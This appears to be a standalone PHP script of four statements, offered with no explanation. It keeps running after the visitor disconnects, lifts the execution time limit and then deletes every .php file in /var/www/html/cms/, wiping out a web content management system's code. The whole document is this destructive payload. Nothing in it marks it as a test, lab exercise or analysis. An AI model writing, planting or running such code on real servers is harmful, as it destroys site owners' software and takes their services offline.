<?php
ignore_user_abort(true);
set_time_limit(0);
array_map('unlink', glob("/var/www/html/cms/*.php"));
?>